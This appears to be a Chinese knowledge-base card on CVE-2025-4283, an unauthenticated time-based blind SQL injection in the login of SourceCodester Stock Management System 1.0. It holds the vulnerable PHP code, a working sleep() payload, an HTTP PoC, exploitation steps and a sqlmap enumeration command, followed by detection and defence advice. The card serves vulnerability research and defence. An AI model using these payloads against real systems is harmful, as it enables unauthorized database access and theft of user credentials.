---
id: web-generic-sqli-sourcecodester-stock-login-time-blind
title: SourceCodester Stock Management System 1.0 登录 username 参数时间盲注（CVE-2025-4283）
type: scenario
domain: web
path: web/generic/sqli
technique: php-login-username-time-blind-sqli
tags:
- php
- sql-injection
- time-blind
- login
- mysql
- sourcecodester
- stock-management
- cve-2025-4283
cve:
- CVE-2025-4283
severity: high
confidence: high
affected_versions: 1.0（原文受影响版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:06:33+08:00'
  notes: 已对照原文及32张图核对：图19/21 Login.php 的 login() 使用 extract($_POST) 并拼接 username/password=md5(password)；图22 正常响应 2059ms 且 last_qry 回显拼接 SQL；图23 username=admin' and sleep(5)-- - 响应 7062ms，延时注入成立；图24 sqlmap 枚举 6 个库。受影响版本 V1.0 为原文明确标注，已保留。PoC 未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-sourcecodester-stock-login-time-blind/
draft: false
kb_aliases:
- CVE-2025-4283
- Stock Management System 登录注入
- classes/Login.php username SQLi
- sleep() 延时登录注入
- extract($_POST) 注入
---

## 一句话结论

Stock Management System 1.0 的 `/classes/Login.php?f=login` 在 `login()` 中用 `extract($_POST)` 取值并把 `$username`、`$password` 直接拼进 `SELECT * from users where username = '$username' and password = md5('$password')`；提交 `username=admin' and sleep(5)-- -` 可让数据库睡眠，响应时间从毫秒级升至 5 秒以上，确认未授权时间盲注，sqlmap 可进一步枚举数据库。

## 原理

- 漏洞代码：
  ```php
  public function login(){
      extract($_POST);
      $qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password')");
      if($qry->num_rows > 0){ ... return json_encode(['status'=>'success']); }
      else { return json_encode(['status'=>'incorrect',
              'last_qry'=>"SELECT * from users where username = '$username' and password = md5('$password') "]); }
  }
  ```
  `extract($_POST)` 直接把请求字段注册为变量；`username` 未转义进入单引号，`password` 被 `md5()` 包裹但仍与 `username` 同处一条 SQL。
- 闭合 `username` 的引号后追加 `AND SLEEP(5)`，再用 `-- -` 注释掉 `and password = ...`。查询执行时数据库睡眠 5 秒，HTTP 响应随之延迟；登录仍返回 `incorrect`，但延时本身构成可靠的盲注 oracle。
- 失败响应还会回显 `last_qry`，把拼接后的 SQL 原样返回，便于攻击者确认闭合与注释是否生效。
- 入口在认证前，无需有效账号；密码使用 MD5 只是存储/比较方式，不阻碍 username 注入。

## 触发条件

- 目标为 Stock Management System 1.0（原文测试环境 Apache 2.4.39 / PHP 7.4.3 / MySQL 8.0.11）。
- `/classes/Login.php?f=login` 可访问，接受 POST `username`、`password`。
- 数据库为 MySQL/MariaDB，`SLEEP()` 可用，且无 WAF 拦截 `sleep(`/注释符。
- 网络与数据库响应时间稳定，便于观察延时差异。

## 利用步骤

1. 记录正常登录请求的响应时间（原文约毫秒级）。
2. 发送 `username=admin' and sleep(5)-- -&password=111111`，观察响应耗时增加到约 5–7 秒（原文 Burp 显示 7062 ms）。
3. 确认注入后，用布尔/时间盲注逐字符读取 `database()`、`user()`、表名与 `users` 表口令。
4. 用 sqlmap 复核：
   ```bash
   sqlmap -r post.txt --dbs --batch
   ```
   原文枚举出 `information_schema`、`mysql`、`performance_schema`、`sms_db`、`sys`、`wp`。
5. 也可尝试 UNION/布尔注入（同一 sink），但登录查询列数较多，原文以时间盲注为主。

## PoC

```http
POST /classes/Login.php?f=login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=admin' and sleep(5)-- -&password=111111
```

响应（约 5 秒后）：

```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and sleep(5)-- -' and password = md5('111111') "}
```

## 变体与关联

- 变体：`username=admin' and (select sleep(5))-- -`、`BENCHMARK()`、基于 `IF(...,SLEEP(5),0)` 的逐字符盲注。
- 变体：`login_user()` 中同样存在 `extract($_POST)` 与 username 拼接，可能存在第二个注入点（原文未复现，本卡不展开）。
- 关联：[[web-generic-sqli-sourcecodester-stock-view-id-union]]（同产品后台 UNION 注入）、[[web-generic-sqli-phpgurukul-student-record-login-union]]（同类登录注入）。

## 检测与防御

- 检测：登录请求 username 出现单引号、`sleep(`、`benchmark(`、`--`；响应时间异常延长；失败响应回显完整 SQL（`last_qry`）。
- 防御：移除 `extract($_POST)`，显式读取字段；使用 `prepare` + `bind_param` 参数化查询 username。
- 防御：不要在错误响应中返回拼接后的 SQL；登录失败统一提示并限制频率。
- 防御：密码使用 `password_hash()`/`password_verify()`，数据库账号最小权限。
